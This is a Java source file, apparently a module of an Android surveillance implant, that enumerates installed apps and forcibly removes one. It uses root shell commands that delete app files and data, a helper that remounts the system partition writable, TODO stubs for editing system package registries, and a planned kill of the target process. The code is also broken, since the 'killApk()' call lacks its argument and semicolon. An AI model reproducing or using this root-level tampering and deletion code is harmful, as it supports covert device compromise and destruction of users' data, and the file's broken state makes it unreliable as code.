package com.android.dvci.util;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.Configuration;
import com.android.mm.M;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by zeno on 16/09/14.
 */
public class PackageUtils {
	/**
	 * The Constant TAG.
	 */
	private static final String TAG = "PackageUtils"; //$NON-NLS-1$

	/**
	 * The Class PInfo.
	 */
	public static class PInfo {
		/**
		 * The appname.
		 */
		private String appname = ""; //$NON-NLS-1$

		/**
		 * The pname.
		 */
		private String pname = ""; //$NON-NLS-1$

		/**
		 * The version name.
		 */
		private String versionName = ""; //$NON-NLS-1$

		/**
		 * The version code.
		 */
		private int versionCode = 0;

		/*
		 * (non-Javadoc)
		 *
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}
	}


	public static boolean uninstallApk(String apk) {
		boolean found = isInstalledApk(apk);
		if(!found){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (uninstallApk), cannot find APK");
			}
			return false;
		}

		remountSystem(true);
		removeAdmin(apk);
		removePackageList(apk);
		removeFiles(apk);
		remountSystem(false);

		killApk()

		return true;
	}

	private static void killApk(String apk) {
		// TODO: kill -9 `psof $apk`
	}

	private static void removePackageList(String apk) {
		// TODO: remove any entries in /data/system/packages.list
		// i.e: com.android.deviceinfo 10216 0 /data/data/com.android.deviceinfo default 1028,1015,3003

	}

	private static void removeAdmin(String apk) {
		// TODO: remove any entries in /data/system/packages.xml


	}

	private static void removeFiles(String apk) {
		Execute.executeRoot("rm /data/app/" + apk + "*.apk");
		Execute.executeRoot("rm -r /data/data/" + apk);

	}

	private static void remountSystem(boolean rw) {
		if(rw){
			Execute.execute(Configuration.shellFile + " " + "blw");
		}else{
			Execute.execute(Configuration.shellFile + " " + "blr");
		}
	}

	private static boolean isInstalledApk(String apk) {
		boolean found = false;
		ArrayList<PInfo> l = getInstalledApps(false);
		for(PInfo p: l){
			if(p.pname.equals(apk)){
				found=true;
				break;
			}
		}
		return found;
	}

	/**
	 * Gets the installed apps.
	 *
	 * @param getSysPackages the get sys packages
	 * @return the installed apps
	 */
	public static ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);

		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);

			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}

			try {
				final PInfo newInfo = new PInfo();
				newInfo.pname = p.packageName;
				if (!newInfo.pname.contains(M.e("keyguard"))) {
					newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
				}
				newInfo.versionName = p.versionName;
				newInfo.versionCode = p.versionCode;
				res.add(newInfo);
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getInstalledApps) Error: " + e);
				}
			}
		}

		return res;
	}

	/**
	 * Gets the packages.
	 *
	 * @return the packages
	 */
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false);
		final int max = apps.size();

		for (int i = 0; i < max; i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
			}
		}

		return apps;
	}
}
